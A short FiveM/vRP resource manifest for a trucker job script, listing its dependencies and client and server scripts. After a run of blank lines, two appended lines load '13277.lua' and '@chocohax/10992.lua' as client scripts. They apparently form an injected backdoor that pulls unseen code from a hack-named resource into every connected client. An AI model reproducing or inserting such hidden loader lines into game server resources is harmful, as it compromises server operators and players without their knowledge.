
description "vRP Trucker"
--ui_page "ui/index.html"

dependency "vrp"
dependency "ghmattimysql"

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "client.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}







client_script "13277.lua"
client_script '@chocohax/10992.lua'